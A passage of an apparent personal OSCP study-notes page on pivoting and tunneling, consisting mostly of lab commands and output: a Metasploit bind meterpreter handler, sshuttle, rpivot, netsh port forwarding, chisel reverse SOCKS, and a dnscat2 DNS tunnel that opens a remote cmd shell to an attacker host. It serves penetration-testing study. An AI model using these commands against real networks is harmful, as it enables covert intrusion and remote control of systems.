</span></span><span style=display:flex><span>Final size of exe file: 7168 bytes
</span></span><span style=display:flex><span>Saved as: backupjob.exe
</span></span></code></pre></div><p>Â </p><h4 id=configuring--starting-the-bind-multihandler>Configuring & Starting the Bind multi/handler</h4><p>Socat Redirection with a Bind Shell</p><div class="highlight wrap-code" dir=auto><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell-session data-lang=shell-session><span style=display:flex><span>msf6 &gt; use exploit/multi/handler
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>[*] Using configured payload generic/shell_reverse_tcp
</span></span><span style=display:flex><span>msf6 exploit(multi/handler) &gt; set payload windows/x64/meterpreter/bind_tcp
</span></span><span style=display:flex><span>payload =&gt; windows/x64/meterpreter/bind_tcp
</span></span><span style=display:flex><span>msf6 exploit(multi/handler) &gt; set RHOST 10.129.202.64
</span></span><span style=display:flex><span>RHOST =&gt; 10.129.202.64
</span></span><span style=display:flex><span>msf6 exploit(multi/handler) &gt; set LPORT 8080
</span></span><span style=display:flex><span>LPORT =&gt; 8080
</span></span><span style=display:flex><span>msf6 exploit(multi/handler) &gt; run
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>[*] Started bind TCP handler against 10.129.202.64:8080
</span></span></code></pre></div><p>Â </p><p>Â </p><h1 id=ssh-for-windows-plinkexe-putty>SSH for Windows: plink.exe putty</h1><div class="highlight wrap-code" dir=auto><pre tabindex=0><code class=language-cmd-session data-lang=cmd-session>plink -ssh -D 9050 ubuntu@10.129.15.50</code></pre></div><p>Â </p><p>Another Windows-based tool called <a href=https://www.proxifier.com/ rel=external>Proxifier</a> can be used to start a SOCKS tunnel via the SSH session we created. Proxifier is a Windows tool that creates a tunneled network for desktop client applications and allows it to operate through a SOCKS or HTTPS proxy and allows for proxy chaining. It is possible to create a profile where we can provide the configuration for our SOCKS server started by Plink on port 9050.</p><p>Â </p><p><a href=#R-image-9a7167d7d319dff1de5f767a16e2334e class=lightbox-link><img alt=5d2fbde83d2b3dda45ef9b07319d78c4.png class="lazy lightbox figure-image" loading=lazy src=https://irfan123456789-hub.github.io/resources/5d2fbde83d2b3dda45ef9b07319d78c4.png style=height:auto;width:auto></a>
<a href=javascript:history.back(); class=lightbox-back id=R-image-9a7167d7d319dff1de5f767a16e2334e><img alt=5d2fbde83d2b3dda45ef9b07319d78c4.png class="lazy lightbox lightbox-image" loading=lazy src=https://irfan123456789-hub.github.io/resources/5d2fbde83d2b3dda45ef9b07319d78c4.png></a></p><p>Â </p><p>Â </p><h1 id=ssh-pivoting-with-sshuttle>SSH Pivoting with Sshuttle</h1><p>Â </p><h4 id=running-sshuttle>Running sshuttle</h4><p>SSH Pivoting with Sshuttle</p><div class="highlight wrap-code" dir=auto><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell-session data-lang=shell-session><span style=display:flex><span>cube111@local[/local]$ sudo sshuttle -r ubuntu@10.129.202.64 172.16.5.0/23 -v 
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>Starting sshuttle proxy (version 1.1.0).
</span></span><span style=display:flex><span>c : Starting firewall manager with command: [&#39;/usr/bin/python3&#39;, &#39;/usr/local/lib/python3.9/dist-packages/sshuttle/__main__.py&#39;, &#39;-v&#39;, &#39;--method&#39;, &#39;auto&#39;, &#39;--firewall&#39;]
</span></span><span style=display:flex><span>fw: Starting firewall with Python version 3.9.2
</span></span><span style=display:flex><span>fw: ready method name nat.
</span></span><span style=display:flex><span>c : IPv6 enabled: Using default IPv6 listen address ::1
</span></span><span style=display:flex><span>c : Method: nat
</span></span><span style=display:flex><span>c : IPv4: on
</span></span><span style=display:flex><span>c : IPv6: on
</span></span><span style=display:flex><span>c : UDP : off (not available with nat method)
</span></span><span style=display:flex><span>c : DNS : off (available)
</span></span><span style=display:flex><span>c : User: off (available)
</span></span><span style=display:flex><span>c : Subnets to forward through remote host (type, IP, cidr mask width, startPort, endPort):
</span></span><span style=display:flex><span>c :   (&lt;AddressFamily.AF_INET: 2&gt;, &#39;172.16.5.0&#39;, 32, 0, 0)
</span></span><span style=display:flex><span>c : Subnets to exclude from forwarding:
</span></span><span style=display:flex><span>c :   (&lt;AddressFamily.AF_INET: 2&gt;, &#39;127.0.0.1&#39;, 32, 0, 0)
</span></span><span style=display:flex><span>c :   (&lt;AddressFamily.AF_INET6: 10&gt;, &#39;::1&#39;, 128, 0, 0)
</span></span><span style=display:flex><span>c : TCP redirector listening on (&#39;::1&#39;, 12300, 0, 0).
</span></span><span style=display:flex><span>c : TCP redirector listening on (&#39;127.0.0.1&#39;, 12300).
</span></span><span style=display:flex><span>c : Starting client with Python version 3.9.2
</span></span><span style=display:flex><span>c : Connecting to server...
</span></span><span style=display:flex><span>ubuntu@10.129.202.64&#39;s password: 
</span></span><span style=display:flex><span> s: Running server on remote host with /usr/bin/python3 (version 3.8.10)
</span></span><span style=display:flex><span> s: latency control setting = True
</span></span><span style=display:flex><span> s: auto-nets:False
</span></span><span style=display:flex><span>c : Connected to server.
</span></span><span style=display:flex><span>fw: setting up.
</span></span><span style=display:flex><span>fw: ip6tables -w -t nat -N sshuttle-12300
</span></span><span style=display:flex><span>fw: ip6tables -w -t nat -F sshuttle-12300
</span></span><span style=display:flex><span>fw: ip6tables -w -t nat -I OUTPUT 1 -j sshuttle-12300
</span></span><span style=display:flex><span>fw: ip6tables -w -t nat -I PREROUTING 1 -j sshuttle-12300
</span></span><span style=display:flex><span>fw: ip6tables -w -t nat -A sshuttle-12300 -j RETURN -m addrtype --dst-type LOCAL
</span></span><span style=display:flex><span>fw: ip6tables -w -t nat -A sshuttle-12300 -j RETURN --dest ::1/128 -p tcp
</span></span><span style=display:flex><span>fw: iptables -w -t nat -N sshuttle-12300
</span></span><span style=display:flex><span>fw: iptables -w -t nat -F sshuttle-12300
</span></span><span style=display:flex><span>fw: iptables -w -t nat -I OUTPUT 1 -j sshuttle-12300
</span></span><span style=display:flex><span>fw: iptables -w -t nat -I PREROUTING 1 -j sshuttle-12300
</span></span><span style=display:flex><span>fw: iptables -w -t nat -A sshuttle-12300 -j RETURN -m addrtype --dst-type LOCAL
</span></span><span style=display:flex><span>fw: iptables -w -t nat -A sshuttle-12300 -j RETURN --dest 127.0.0.1/32 -p tcp
</span></span></code></pre></div><p>Â </p><p>Â </p><h1 id=web-server-pivoting-with-rpivot>Web Server Pivoting with Rpivot</h1><p>Â </p><h4 id=running-serverpy-from-the-attack-host>Running server.py from the Attack Host</h4><p>Web Server Pivoting with Rpivot</p><div class="highlight wrap-code" dir=auto><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell-session data-lang=shell-session><span style=display:flex><span>cube111@local[/local]$ python2.7 server.py --proxy-port 9050 --server-port 9999 --server-ip 0.0.0.0
</span></span></code></pre></div><p>Â </p><h4 id=transfering-rpivot-to-the-target>Transfering rpivot to the Target</h4><p>Web Server Pivoting with Rpivot</p><div class="highlight wrap-code" dir=auto><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell-session data-lang=shell-session><span style=display:flex><span>cube111@local[/local]$ scp -r rpivot ubuntu@&lt;IpaddressOfTarget&gt;:/home/ubuntu/
</span></span></code></pre></div><h4 id=running-clientpy-from-pivot-target>Running client.py from Pivot Target</h4><p>Web Server Pivoting with Rpivot</p><div class="highlight wrap-code" dir=auto><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell-session data-lang=shell-session><span style=display:flex><span>ubuntu@WEB01:~/rpivot$ python2.7 client.py --server-ip 10.10.14.18 --server-port 9999
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>Backconnecting to server 10.10.14.18 port 9999
</span></span></code></pre></div><p>Â </p><p>Â </p><h4 id=using-netshexe-to-port-forward>Using Netsh.exe to Port Forward</h4><p>Port Forwarding with Windows Netsh</p><div class="highlight wrap-code" dir=auto><pre tabindex=0><code class=language-cmd-session data-lang=cmd-session>C:\Windows\system32&gt; netsh.exe interface portproxy add v4tov4 listenport=8080 listenaddress=10.129.42.198 connectport=3389 connectaddress=172.16.5.25</code></pre></div><p>Â </p><p>Â </p><h4 id=verifying-port-forward>Verifying Port Forward</h4><p>Port Forwarding with Windows Netsh</p><div class="highlight wrap-code" dir=auto><pre tabindex=0><code class=language-cmd-session data-lang=cmd-session>C:\Windows\system32&gt; netsh.exe interface portproxy show v4tov4</code></pre></div><p>Â </p><p>Â </p><p>Â </p><h1 id=dns-tunneling-with-dnscat2>DNS Tunneling with Dnscat2</h1><p>Â </p><h4 id=cloning-dnscat2-and-setting-up-the-server>Cloning dnscat2 and Setting Up the Server</h4><p>DNS Tunneling with Dnscat2</p><div class="highlight wrap-code" dir=auto><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell-session data-lang=shell-session><span style=display:flex><span>cube111@local[/local]$ git clone https://github.com/iagox86/dnscat2.git
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>cd dnscat2/server/
</span></span><span style=display:flex><span>sudo gem install bundler
</span></span><span style=display:flex><span>sudo bundle instal
</span></span></code></pre></div><div class="highlight wrap-code" dir=auto><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell-session data-lang=shell-session><span style=display:flex><span>cube111@local[/local]$ sudo ruby dnscat2.rb --dns host=10.10.14.18,port=53,domain=inlanefreight.local --no-cache
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>New window created: 0
</span></span><span style=display:flex><span>dnscat2&gt; New window created: crypto-debug
</span></span><span style=display:flex><span>Welcome to dnscat2! Some documentation may be out of date.
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>auto_attach =&gt; false
</span></span><span style=display:flex><span>history_size (for new windows) =&gt; 1000
</span></span><span style=display:flex><span>Security policy changed: All connections must be encrypted
</span></span><span style=display:flex><span>New window created: dns1
</span></span><span style=display:flex><span>Starting Dnscat2 DNS server on 10.10.14.18:53
</span></span><span style=display:flex><span>[domains = inlanefreight.local]...
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>Assuming you have an authoritative DNS server, you can run
</span></span></code></pre></div><p>Â </p><h4 id=cloning-dnscat2-powershell-to-the-attack-host>Cloning dnscat2-powershell to the Attack Host</h4><p>DNS Tunneling with Dnscat2</p><div class="highlight wrap-code" dir=auto><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell-session data-lang=shell-session><span style=display:flex><span>cube111@local[/local]$ git clone https://github.com/lukebaggett/dnscat2-powershell.git
</span></span></code></pre></div><p>Â </p><h4 id=importing-dnscat2ps1>Importing dnscat2.ps1</h4><p>DNS Tunneling with Dnscat2</p><div class="highlight wrap-code" dir=auto><pre tabindex=0><code class=language-powershell-session data-lang=powershell-session>PS C:\local&gt; Import-Module .\dnscat2.ps1</code></pre></div><div class="highlight wrap-code" dir=auto><pre tabindex=0><code class=language-powershell-session data-lang=powershell-session>PS C:\local&gt; Start-Dnscat2 -DNSserver 10.10.14.18 -Domain inlanefreight.local -PreSharedSecret 0ec04a91cd1e963f8c03ca499d589d21 -Exec cmd</code></pre></div><p>Â </p><p>Â </p><h4 id=interacting-with-the-established-session>Interacting with the Established Session</h4><p>DNS Tunneling with Dnscat2</p><div class="highlight wrap-code" dir=auto><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell-session data-lang=shell-session><span style=display:flex><span>dnscat2&gt; window -i 1
</span></span><span style=display:flex><span>New window created: 1
</span></span><span style=display:flex><span>history_size (session) =&gt; 1000
</span></span><span style=display:flex><span>Session 1 Security: ENCRYPTED AND VERIFIED!
</span></span><span style=display:flex><span>(the security depends on the strength of your pre-shared secret!)
</span></span><span style=display:flex><span>This is a console session!
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>That means that anything you type will be sent as-is to the
</span></span><span style=display:flex><span>client, and anything they type will be displayed as-is on the
</span></span><span style=display:flex><span>screen! If the client is executing a command and you don&#39;t
</span></span><span style=display:flex><span>see a prompt, try typing &#39;pwd&#39; or something!
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>To go back, type ctrl-z.
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>Microsoft Windows [Version 10.0.18363.1801]
</span></span><span style=display:flex><span>(c) 2019 Microsoft Corporation. All rights reserved.
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>C:\Windows\system32&gt;
</span></span><span style=display:flex><span>exec (OFFICEMANAGER) 1&gt;
</span></span></code></pre></div><p>Â </p><p>Â </p><h4 id=starting-the-chisel-server-on-our-attack-host>Starting the Chisel Server on our Attack Host</h4><p>Â </p><div class="highlight wrap-code" dir=auto><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell-session data-lang=shell-session><span style=display:flex><span>cube111@local[/local]$ sudo ./chisel server --reverse -v -p 1234 --socks5
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>2022/05/30 10:19:16 server: Reverse tunnelling enabled
</span></span><span style=display:flex><span>2022/05/30 10:19:16 server: Fingerprint n6UFN6zV4F+MLB8WV3x25557w/gHqMRggEnn15q9xIk=
</span></span><span style=display:flex><span>2022/05/30 10:19:16 server: Listening on http://0.0.0.0:1234
</span></span></code></pre></div><p>Â </p><div class="highlight wrap-code" dir=auto><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell-session data-lang=shell-session><span style=display:flex><span>ubuntu@WEB01$ ./chisel client -v 10.10.14.17:1234 R:socks
</span></span></code></pre></div><h4 id=running-the-chisel-server-on-the-pivot-host>Running the Chisel Server on the Pivot Host</h4><p>SOCKS5 Tunneling with Chisel</p><div class="highlight wrap-code" dir=auto><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell-session data-lang=shell-session><span style=display:flex><span>ubuntu@WEB01:~$ ./chisel server -v -p 1234 --socks5
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>2022/05/05 18:16:25 server: Fingerprint Viry7WRyvJIOPveDzSI2piuIvtu9QehWw9TzA3zspac=
</span></span><span style=display:flex><span>2022/05/05 18:16:25 server: Listening on http://0.0.0.0:1234
</span></span></code></pre></div><p>Â </p><h4 id=connecting-to-the-chisel-server>Connecting to the Chisel Server</h4><p>SOCKS5 Tunneling with Chisel</p><div class="highlight wrap-code" dir=auto><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell-session data-lang=shell-session><span style=display:flex><span>cube111@local[/local]$ ./chisel client -v 10.129.202.64:1234 socks
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>2022/05/05 14:21:18 client: Connecting to ws://10.129.202.64:1234
</span></span><span style=display:flex><span>2022/05/05 14:21:18 client: tun: proxy#127.0.0.1:1080=&gt;socks: Listening
</span></span><span style=display:flex><span>2022/05/05 14:21:18 client: tun: Bound proxies
</span></span><span style=display:flex><span>2022/05/05 14:21:19 client: Handshaking...
</span></span><span style=display:flex><span>2022/05/05 14:21:19 client: Sending config
</span></span><span style=display:flex><span>2022/05/05 14:21:19 client: Connected (Latency 120.170822ms)
</span></span><span style=display:flex><span>2022/05/05 14:21:19 client: tun: SSH connected
</span></span></code></pre></div><p>Â </p><p>Â </p><h1 id=proxytunnel>proxytunnel</h1><div class="highlight wrap-code" dir=auto><pre tabindex=0><code>proxytunnel-p $IP:3128 -d 127.0.0.1:22 -a 4444</code></pre></div><p>Â </p><p>Â </p><p>Â </p><footer class=footline></footer></article></div></main></div><aside id=R-sidebar class=default-animation><div id=R-header-topbar class=default-animation></div><div id=R-header-wrapper class=default-animation><div id=R-header class=default-animation><a id=R-logo class=R-default href=https://irfan123456789-hub.github.io/><div class=logo-title style=display:flex;align-items:center><img src=https://irfan123456789-hub.github.io/images/logo.png alt=Logo style=width:90px;height:80>
<span>DrakonOps</span></div></a></div><search><form action=https://irfan123456789-hub.github.io/search/index.html method=get><div class="searchbox default-animation"><button class=search-detail type=submit title="Search (CTRL+ALT+f)"><i class="fas fa-search"></i></button>
<label class=a11y-only for=R-search-by>Search</label>
<input data-search-input id=R-search-by name=search-by class=search-by type=search placeholder=Search...>
<button class=search-clear type=button data-search-clear title="Clear search"><i class="fas fa-times" title="Clear search"></i></button></div></form></search></div><div id=R-homelinks class="default-animation homelinks"><div class="R-menu-divider default-animation"><hr class=padding></div><div class="R-sidebarmenu R-shortcutmenu-homelinks"><ul class="space collapsible-menu"><li data-nav-url=https://irfan123456789-hub.github.io/index.html><a class=padding href=https://irfan123456789-hub.github.io/index.html><i class="fa-fw fas fa-home"></i> Home</a></li></ul></div><div class="R-menu-divider default-animation"><hr class=padding></div><div class="R-sidebarmenu R-shortcutmenu-headercontrols"><ul></ul></div><div class="R-menu-divider default-animation"><hr class=padding></div></div><div id=R-content-wrapper class=highlightable><div class="R-sidebarmenu R-shortcutmenu-main"><ul class="enlarge morespace collapsible-menu"><li class=parent data-nav-url=https://irfan123456789-hub.github.io/oscp-notes/index.html><input type=checkbox id=R-section-5f51e3ac21bcc264f305c28eac7484ea aria-controls=R-subsections-5f51e3ac21bcc264f305c28eac7484ea checked><label for=R-section-5f51e3ac21bcc264f305c28eac7484ea><i class="fa-fw fas fa-chevron-right"></i><span class=a11y-only>Submenu OSCP Notes</span></label><a class=padding href=https://irfan123456789-hub.github.io/oscp-notes/index.html>OSCP Notes<i class="fa-fw fas fa-check read-icon"></i></a><ul id=R-subsections-5f51e3ac21bcc264f305c28eac7484ea class=collapsible-menu><li data-nav-url=https://irfan123456789-hub.github.io/oscp-notes/main-methodology/index.html><a class=padding href=https://irfan123456789-hub.github.io/oscp-notes/main-methodology/index.html>main methodology<i class="fa-fw fas fa-check read-icon"></i></a></li><li data-nav-url=https://irfan123456789-hub.github.io/oscp-notes/methodology/index.html><a class=padding href=https://irfan123456789-hub.github.io/oscp-notes/methodology/index.html>methodology<i class="fa-fw fas fa-check read-icon"></i></a></li><li data-nav-url=https://irfan123456789-hub.github.io/oscp-notes/project/index.html><a class=padding href=https://irfan123456789-hub.github.io/oscp-notes/project/index.html>project<i class="fa-fw fas fa-check read-icon"></i></a></li><li data-nav-url=https://irfan123456789-hub.github.io/oscp-notes/footprinting-and-finger-printing-web-apps/index.html><a class=padding href=https://irfan123456789-hub.github.io/oscp-notes/footprinting-and-finger-printing-web-apps/index.html>footprinting and finger printing web apps<i class="fa-fw fas fa-check read-icon"></i></a></li><li data-nav-url=https://irfan123456789-hub.github.io/oscp-notes/nmap/index.html><a class=padding href=https://irfan123456789-hub.github.io/oscp-notes/nmap/index.html>nmap<i class="fa-fw fas fa-check read-icon"></i></a></li><li data-nav-url=https://irfan123456789-hub.github.io/oscp-notes/go-busters/index.html><a class=padding href=https://irfan123456789-hub.github.io/oscp-notes/go-busters/index.html>Go busters<i class="fa-fw fas fa-check read-icon"></i></a></li><li data-nav-url=https://irfan123456789-hub.github.io/oscp-notes/dns/index.html><a class=padding href=https://irfan123456789-hub.github.io/oscp-notes/dns/index.html>dns<i class="fa-fw fas fa-check read-icon"></i></a></li><li data-nav-url=https://irfan123456789-hub.github.io/oscp-notes/smb/index.html><a class=padding href=https://irfan123456789-hub.github.io/oscp-notes/smb/index.html>smb<i class="fa-fw fas fa-check read-icon"></i></a></li><li data-nav-url=https://irfan123456789-hub.github.io/oscp-notes/nfs/index.html><a class=padding href=https://irfan123456789-hub.github.io/oscp-notes/nfs/index.html>nfs<i class="fa-fw fas fa-check read-icon"></i></a></li><li data-nav-url=https://irfan123456789-hub.github.io/oscp-notes/ftp/index.html><a class=padding href=https://irfan123456789-hub.github.io/oscp-notes/ftp/index.html>ftp<i class="fa-fw fas fa-check read-icon"></i></a></li><li data-nav-url=https://irfan123456789-hub.github.io/oscp-notes/smtp/index.html><a class=padding href=https://irfan123456789-hub.github.io/oscp-notes/smtp/index.html>smtp<i class="fa-fw fas fa-check read-icon"></i></a></li><li data-nav-url=https://irfan123456789-hub.github.io/oscp-notes/snmp/index.html><a class=padding href=https://irfan123456789-hub.github.io/oscp-notes/snmp/index.html>snmp<i class="fa-fw fas fa-check read-icon"></i></a></li><li data-nav-url=https://irfan123456789-hub.github.io/oscp-notes/imap-and-pop/index.html><a class=padding href=https://irfan123456789-hub.github.io/oscp-notes/imap-and-pop/index.html>imap and pop<i class="fa-fw fas fa-check read-icon"></i></a></li><li data-nav-url=https://irfan123456789-hub.github.io/oscp-notes/mssql/index.html><a class=padding href=https://irfan123456789-hub.github.io/oscp-notes/mssql/index.html>mssql<i class="fa-fw fas fa-check read-icon"></i></a></li><li data-nav-url=https://irfan123456789-hub.github.io/oscp-notes/oracle-databases-tns/index.html><a class=padding href=https://irfan123456789-hub.github.io/oscp-notes/oracle-databases-tns/index.html>oracle databases TNS<i class="fa-fw fas fa-check read-icon"></i></a></li><li data-nav-url=https://irfan123456789-hub.github.io/oscp-notes/ipmi/index.html><a class=padding href=https://irfan123456789-hub.github.io/oscp-notes/ipmi/index.html>IPMI<i class="fa-fw fas fa-check read-icon"></i></a></li><li data-nav-url=https://irfan123456789-hub.github.io/oscp-notes/vhosts/index.html><a class=padding href=https://irfan123456789-hub.github.io/oscp-notes/vhosts/index.html>vhosts<i class="fa-fw fas fa-check read-icon"></i></a></li><li data-nav-url=https://irfan123456789-hub.github.io/oscp-notes/web-attacks/index.html><a class=padding href=https://irfan123456789-hub.github.io/oscp-notes/web-attacks/index.html>Web Attacks<i class="fa-fw fas fa-check read-icon"></i></a></li><li data-nav-url=https://irfan123456789-hub.github.io/oscp-notes/xss/index.html><a class=padding href=https://irfan123456789-hub.github.io/oscp-notes/xss/index.html>XSS<i class="fa-fw fas fa-check read-icon"></i></a></li><li data-nav-url=https://irfan123456789-hub.github.io/oscp-notes/login-brute-force-wordlists/index.html><a class=padding href=https://irfan123456789-hub.github.io/oscp-notes/login-brute-force-wordlists/index.html>login brute force wordlists<i class="fa-fw fas fa-check read-icon"></i></a></li><li data-nav-url=https://irfan123456789-hub.github.io/oscp-notes/crackmapexec/index.html><a class=padding href=https://irfan123456789-hub.github.io/oscp-notes/crackmapexec/index.html>crackmapexec<i class="fa-fw fas fa-check read-icon"></i></a></li><li data-nav-url=https://irfan123456789-hub.github.io/oscp-notes/eum4linux/index.html><a class=padding href=https://irfan123456789-hub.github.io/oscp-notes/eum4linux/index.html>eum4linux<i class="fa-fw fas fa-check read-icon"></i></a></li><li data-nav-url=https://irfan123456789-hub.github.io/oscp-notes/rpcclient/index.html><a class=padding href=https://irfan123456789-hub.github.io/oscp-notes/rpcclient/index.html>rpcclient<i class="fa-fw fas fa-check read-icon"></i></a></li><li data-nav-url=https://irfan123456789-hub.github.io/oscp-notes/spwaning-shell/index.html><a class=padding href=https://irfan123456789-hub.github.io/oscp-notes/spwaning-shell/index.html>spwaning shell<i class="fa-fw fas fa-check read-icon"></i></a></li><li data-nav-url=https://irfan123456789-hub.github.io/oscp-notes/file-transfers-windows/index.html><a class=padding href=https://irfan123456789-hub.github.io/oscp-notes/file-transfers-windows/index.html>File transfers windows<i class="fa-fw fas fa-check read-icon"></i></a></li><li data-nav-url=https://irfan123456789-hub.github.io/oscp-notes/file-transfer-using-nc_ncat-and-rdp_winrm/index.html><a class=padding href=https://irfan123456789-hub.github.io/oscp-notes/file-transfer-using-nc_ncat-and-rdp_winrm/index.html>file transfer using nc_ncat and rdp_winrm<i class="fa-fw fas fa-check read-icon"></i></a></li><li data-nav-url=https://irfan123456789-hub.github.io/oscp-notes/living-off-the-land-file-transfer/index.html><a class=padding href=https://irfan123456789-hub.github.io/oscp-notes/living-off-the-land-file-transfer/index.html>living off the land file transfer<i class="fa-fw fas fa-check read-icon"></i></a></li><li data-nav-url=https://irfan123456789-hub.github.io/oscp-notes/transferring-files-with-code/index.html><a class=padding href=https://irfan123456789-hub.github.io/oscp-notes/transferring-files-with-code/index.html>Transferring Files with Code<i class="fa-fw fas fa-check read-icon"></i></a></li><li data-nav-url=https://irfan123456789-hub.github.io/oscp-notes/privilige-escalation/index.html><a class=padding href=https://irfan123456789-hub.github.io/oscp-notes/privilige-escalation/index.html>privilige escalation<i class="fa-fw fas fa-check read-icon"></i></a></li><li data-nav-url=https://irfan123456789-hub.github.io/oscp-notes/linux-privilege-escalation/index.html><a class=padding href=https://irfan123456789-hub.github.io/oscp-notes/linux-privilege-escalation/index.html>linux privilege escalation<i class="fa-fw fas fa-check read-icon"></i></a></li><li data-nav-url=https://irfan123456789-hub.github.io/oscp-notes/windows-privilege-escalation/index.html><a class=padding href=https://irfan123456789-hub.github.io/oscp-notes/windows-privilege-escalation/index.html>Windows Privilege Escalation<i class="fa-fw fas fa-check read-icon"></i></a></li><li class=active data-nav-url=https://irfan123456789-hub.github.io/oscp-notes/pivoting_tunneling/index.html><a class=padding href=https://irfan123456789-hub.github.io/oscp-notes/pivoting_tunneling/index.html>Scanning the Pivot Target<i class="fa-fw fas fa-check read-icon"></i></a></li><li data-nav-url=https://irfan123456789-hub.github.io/oscp-notes/the-active-directory/index.html><a class=padding href=https://irfan123456789-hub.github.io/oscp-notes/the-active-directory/index.html>The Active Directory<i class="fa-fw fas fa-check read-icon"></i></a></li><li data-nav-url=https://irfan123456789-hub.github.io/oscp-notes/the-metasploit-framework/index.html><a class=padding href=https://irfan123456789-hub.github.io/oscp-notes/the-metasploit-framework/index.html>The Metasploit Framework<i class="fa-fw fas fa-check read-icon"></i></a></li><li data-nav-url=https://irfan123456789-hub.github.io/oscp-notes/linux-remote-management/index.html><a class=padding href=https://irfan123456789-hub.github.io/oscp-notes/linux-remote-management/index.html>Linux Remote Management<i class="fa-fw fas fa-check read-icon"></i></a></li><li data-nav-url=https://irfan123456789-hub.github.io/oscp-notes/rdp-and-windows-remote-management/index.html><a class=padding href=https://irfan123456789-hub.github.io/oscp-notes/rdp-and-windows-remote-management/index.html>RDP and winrm<i class="fa-fw fas fa-check read-icon"></i></a></li><li data-nav-url=https://irfan123456789-hub.github.io/oscp-notes/file-transfers-linux/index.html><a class=padding href=https://irfan123456789-hub.github.io/oscp-notes/file-transfers-linux/index.html>File transfers Linux<i class="fa-fw fas fa-check read-icon"></i></a></li><li data-nav-url=https://irfan123456789-hub.github.io/oscp-notes/password-attacks/index.html><a class=padding href=https://irfan123456789-hub.github.io/oscp-notes/password-attacks/index.html>password attacks<i class="fa-fw fas fa-check read-icon"></i></a></li></ul></li></ul></div><div class="R-sidebarmenu R-shortcutmenu-shortcuts"><ul class="space collapsible-menu"></ul></div><div id=R-footer-margin></div><div class="R-menu-divider default-animation"><hr class=padding></div><div class="R-sidebarmenu R-shortcutmenu-footercontrols"><ul><li class=R-historyclearer><div class="padding menu-control"><i class="fa-fw fas fa-history"></i>
<span>&nbsp;</span><div class=control-style><button>Clear History</button></div><div class=clear></div></div></li></ul></div><div id=R-footer><p>Built with <a href=https://github.com/McShelby/hugo-theme-relearn title=love><i class="fas fa-heart"></i></a> by <a href=https://gohugo.io/>Hugo</a></p></div></div></aside><script src=https://irfan123456789-hub.github.io/js/js-yaml/js-yaml.min.js?1762045851 defer></script><script src=https://irfan123456789-hub.github.io/js/d3/d3-color.min.js?1762045851 defer></script><script src=https://irfan123456789-hub.github.io/js/d3/d3-dispatch.min.js?1762045851 defer></script><script src=https://irfan123456789-hub.github.io/js/d3/d3-drag.min.js?1762045851 defer></script><script src=https://irfan123456789-hub.github.io/js/d3/d3-ease.min.js?1762045851 defer></script><script src=https://irfan123456789-hub.github.io/js/d3/d3-interpolate.min.js?1762045851 defer></script><script src=https://irfan123456789-hub.github.io/js/d3/d3-selection.min.js?1762045851 defer></script><script src=https://irfan123456789-hub.github.io/js/d3/d3-timer.min.js?1762045851 defer></script><script src=https://irfan123456789-hub.github.io/js/d3/d3-transition.min.js?1762045851 defer></script><script src=https://irfan123456789-hub.github.io/js/d3/d3-zoom.min.js?1762045851 defer></script><script 